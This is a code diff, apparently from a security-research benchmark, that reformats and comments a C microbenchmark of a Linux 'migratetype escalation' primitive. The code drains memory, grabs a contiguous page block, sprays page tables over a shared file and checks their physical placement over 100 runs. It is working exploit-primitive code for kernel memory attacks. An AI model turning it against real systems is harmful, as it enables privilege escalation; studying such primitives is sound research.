@@ -28,135 +28,155 @@
 #define SPRAY_START 0x100000000UL
 
 static int fd_spray;
-static void *file_ptr;
+static void* file_ptr;
 static unsigned long file_phys;
 
-static void *pageblock;
+static void* pageblock;
 
-static void *target;
+static void* target;
 static unsigned long target_phys;
 
 void open_spraying_file() {
-  const char *buf = "ffffffffffffffff";
+    const char* buf = "ffffffffffffffff";
 
-  fd_spray = open("/dev/shm", O_TMPFILE | O_RDWR, S_IRUSR | S_IWUSR);
-  write(fd_spray, buf, 8);
-  file_ptr = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
-                  MAP_SHARED | MAP_POPULATE, fd_spray, 0);
-  mlock(file_ptr, PAGE_SIZE);
+    fd_spray = open("/dev/shm", O_TMPFILE | O_RDWR, S_IRUSR | S_IWUSR);
+    write(fd_spray, buf, 8);
+    file_ptr = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
+                    MAP_SHARED | MAP_POPULATE, fd_spray, 0);
+    mlock(file_ptr, PAGE_SIZE);
 
-  file_phys = rubench_va_to_pa(file_ptr);
+    file_phys = rubench_va_to_pa(file_ptr);
 }
 
 void close_spraying_file() {
-  munlock(file_ptr, PAGE_SIZE);
-  munmap(file_ptr, PAGE_SIZE);
-  close(fd_spray);
+    munlock(file_ptr, PAGE_SIZE);
+    munmap(file_ptr, PAGE_SIZE);
+    close(fd_spray);
 }
 
 int spray_tables() {
-  for (unsigned i = 0; i < NR_VMA_LIMIT; ++i) {
-    void *addr = (void *)(SPRAY_START + PAGE_TABLE_BACKED_SIZE * i);
-    if (mmap(addr, PAGE_SIZE, PROT_READ | PROT_WRITE,
-             MAP_FIXED | MAP_SHARED | MAP_POPULATE, fd_spray,
-             0) == MAP_FAILED) {
-      printf("Failed to spray tables\n");
-      exit(EXIT_FAILURE);
+    for(unsigned i = 0; i < NR_VMA_LIMIT; ++i) {
+        void* addr = (void*)(SPRAY_START + PAGE_TABLE_BACKED_SIZE * i);
+        if(mmap(addr, PAGE_SIZE, PROT_READ | PROT_WRITE,
+                MAP_FIXED | MAP_SHARED | MAP_POPULATE, fd_spray,
+                0) == MAP_FAILED) {
+            printf("Failed to spray tables\n");
+            exit(EXIT_FAILURE);
+        }
     }
-  }
 
-  return 0;
+    return 0;
 }
 
 void unspray_tables() {
-  for (unsigned i = 1; i < NR_VMA_LIMIT; ++i) {
-    void *addr = (void *)(SPRAY_START + PAGE_TABLE_BACKED_SIZE * i);
-    if (munmap(addr, PAGE_SIZE)) {
-      printf("Failed to unspray tables\n");
-      exit(EXIT_FAILURE);
+    for(unsigned i = 1; i < NR_VMA_LIMIT; ++i) {
+        void* addr = (void*)(SPRAY_START + PAGE_TABLE_BACKED_SIZE * i);
+        if(munmap(addr, PAGE_SIZE)) {
+            printf("Failed to unspray tables\n");
+            exit(EXIT_FAILURE);
+        }
     }
-  }
 }
 
-void *get_page_block() {
-  size_t drain_size = PAGE_SIZE * sysconf(_SC_AVPHYS_PAGES) - ZONE_RESERVE;
+void* get_page_block() {
+    // Drain memory so the allocator must split big blocks
+    size_t drain_size = PAGE_SIZE * sysconf(_SC_AVPHYS_PAGES) - ZONE_RESERVE;
 
-  void *drain = mmap(NULL, drain_size, PROT_READ | PROT_WRITE,
-                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
-  if (drain == MAP_FAILED) {
-    printf("Failed to drain memory\n");
-    exit(EXIT_FAILURE);
-  }
+    // MAP_POPULATE forces immediate backing, ensuring the pages
+    // really come from the buddy allocator and are not lazily allocated.
+    void* drain = mmap(NULL, drain_size, PROT_READ | PROT_WRITE,
+                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
+    if(drain == MAP_FAILED) {
+        printf("Failed to drain memory\n");
+        exit(EXIT_FAILURE);
+    }
 
-  void *drain_end = (void *)((unsigned long)drain + drain_size - PAGE_SIZE);
-  unsigned long drain_end_phys = rubench_va_to_pa(drain_end);
+    // Locate the last page we own and compute its PA.
+    // The end of the drained region is the part most likely to lie in
+    // a freshly-split, contiguous block, because the allocator consumes
+    // smaller orders first and splits larger ones only at the very end.
+    void* drain_end = (void*)((unsigned long)drain + drain_size - PAGE_SIZE);
+    unsigned long drain_end_phys = rubench_va_to_pa(drain_end);
 
-  void *aligned = (void *)((unsigned long)drain_end -
-                           (drain_end_phys % PAGEBLOCK_SIZE) - PAGEBLOCK_SIZE);
+    // Walk back to the previous 2 MiB boundary
+    // We want an entire page-block; subtract the PA’s offset inside
+    //  its 2 MiB region and then go one full block backwards so the whole
+    //  range belongs to us.
+    void* page_block_aligned = (void*)((unsigned long)drain_end -
+        (drain_end_phys % PAGEBLOCK_SIZE) - PAGEBLOCK_SIZE);
 
-  void *pageblock = mremap(aligned, PAGEBLOCK_SIZE, PAGEBLOCK_SIZE,
-                           MREMAP_FIXED | MREMAP_MAYMOVE, REMAP_ADDRESS);
+    // Remap exactly that 2 MiB span to a fixed VA
+    // Using MREMAP_FIXED lets us park the block at a predictable
+    // virtual address (REMAP_ADDRESS) without copying. The physical
+    // pages stay put; only page tables change, which is cheap and keeps
+    // the block contiguous.
+    void* page_block = mremap(page_block_aligned, PAGEBLOCK_SIZE, PAGEBLOCK_SIZE,
+                             MREMAP_FIXED | MREMAP_MAYMOVE, REMAP_ADDRESS);
 
-  munmap(drain, drain_size);
+    // No further use for the huge ‘drain’ region – free it to relieve
+    // memory pressure before the next stages of the attack.
+    munmap(drain, drain_size);
 
-  unsigned long start_phys = rubench_va_to_pa(pageblock);
-  unsigned long end_phys = rubench_va_to_pa(
-      (void *)((unsigned long)pageblock + PAGEBLOCK_SIZE - PAGE_SIZE));
+    unsigned long start_phys = rubench_va_to_pa(page_block);
+    unsigned long end_phys   = rubench_va_to_pa(
+        (void*)((unsigned long)page_block + PAGEBLOCK_SIZE - PAGE_SIZE));
 
-  if (start_phys % PAGEBLOCK_SIZE != 0 ||
-      end_phys % PAGEBLOCK_SIZE != PAGEBLOCK_SIZE - PAGE_SIZE) {
+    // Heuristic check if it's continuous.
+    if(start_phys % PAGEBLOCK_SIZE == 0 &&
+        end_phys % PAGEBLOCK_SIZE == PAGEBLOCK_SIZE - PAGE_SIZE) {
+        return page_block;
+    }
+
     return MAP_FAILED;
-  }
-
-  return pageblock;
 }
 
 void pre_migratetype_escalation() {
-  do {
-    pageblock = get_page_block();
-  } while (pageblock == MAP_FAILED);
+    do {
+        pageblock = get_page_block();
+    } while(pageblock == MAP_FAILED);
 
-  target = (void *)((unsigned long)pageblock + TARGET_OFFSET);
-  mlock((void *)((unsigned long)target - PAGE_SIZE), 3 * PAGE_SIZE);
-  target_phys = rubench_va_to_pa(target);
-  open_spraying_file();
+    target = (void*)((unsigned long)pageblock + TARGET_OFFSET);
+    mlock((void*)((unsigned long)target - PAGE_SIZE), 3 * PAGE_SIZE);
+    target_phys = rubench_va_to_pa(target);
+    open_spraying_file();
 }
 
 void microbenchmark_migratetype_escalation() {
-  void *bait_ptr = (void *)((unsigned long)pageblock + PAGEBLOCK_SIZE / 2);
-  migratetype_escalation(bait_ptr, 9, spray_tables);
-  unspray_tables();
+    void* bait_ptr = (void*)((unsigned long)pageblock + PAGEBLOCK_SIZE / 2);
+    migratetype_escalation(bait_ptr, 9, spray_tables);
+    unspray_tables();
 
-  munlock(target, PAGE_SIZE);
-  block_merge(target, 0);
-  mmap((void *)(SPRAY_START + PAGEBLOCK_SIZE), PAGE_SIZE,
-       PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_POPULATE, fd_spray,
-       0);
+    munlock(target, PAGE_SIZE);
+    block_merge(target, 0);
+    mmap((void*)(SPRAY_START + PAGEBLOCK_SIZE), PAGE_SIZE,
+         PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_POPULATE,
+         fd_spray,
+         0);
 }
 
 int post_migratetype_escalation() {
-  unsigned long value = rubench_read_phys(target_phys);
+    unsigned long value = rubench_read_phys(target_phys);
 
-  printf("Pageblock physical address: %lx\n", target_phys);
-  printf("File physical address: %lx\n", file_phys);
-  printf("Value read from target: %lx\n", value);
+    printf("Pageblock physical address: %lx\n", target_phys);
+    printf("File physical address: %lx\n", file_phys);
+    printf("Value read from target: %lx\n", value);
 
-  munmap((void *)SPRAY_START, PAGE_SIZE);
-  munmap((void *)(SPRAY_START + PAGEBLOCK_SIZE), PAGE_SIZE);
-  close_spraying_file();
+    munmap((void*)SPRAY_START, PAGE_SIZE);
+    munmap((void*)(SPRAY_START + PAGEBLOCK_SIZE), PAGE_SIZE);
+    close_spraying_file();
 
-  munlock((void *)((unsigned long)target - PAGE_SIZE), 3 * PAGE_SIZE);
-  munmap(pageblock, PAGEBLOCK_SIZE);
-  return (value & 0xFFFFFFFFF000) != file_phys;
+    munlock((void*)((unsigned long)target - PAGE_SIZE), 3 * PAGE_SIZE);
+    munmap(pageblock, PAGEBLOCK_SIZE);
+    return (value & 0xFFFFFFFFF000) != file_phys;
 }
 
 int main(void) {
-  rubench_open();
+    rubench_open();
 
-  run_microbenchmark(100, pre_migratetype_escalation,
-                     microbenchmark_migratetype_escalation,
-                     post_migratetype_escalation);
+    run_microbenchmark(100, pre_migratetype_escalation,
+                       microbenchmark_migratetype_escalation,
+                       post_migratetype_escalation);
 
-  rubench_close();
-  return 0;
+    rubench_close();
+    return 0;
 }
